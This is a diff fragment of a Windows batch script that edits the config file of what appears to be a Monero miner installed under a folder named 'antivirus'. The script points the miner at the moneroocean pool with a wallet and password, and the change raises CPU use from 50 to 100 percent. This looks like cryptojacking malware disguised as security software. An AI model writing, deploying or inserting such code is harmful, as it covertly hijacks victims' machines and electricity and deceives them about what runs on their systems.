@@ -234,7 +234,7 @@ if not [%EMAIL%] == [] (
 powershell -Command "$out = cat '%USERPROFILE%\antivirus\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.moneroocean.stream:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\antivirus\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\antivirus\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\antivirus\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\antivirus\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\antivirus\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\antivirus\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 50,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\antivirus\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\antivirus\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\antivirus\config.json'" 
 set LOGFILE2=%LOGFILE:\=\\%
 powershell -Command "$out = cat '%USERPROFILE%\antivirus\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\antivirus\config.json'" 
 
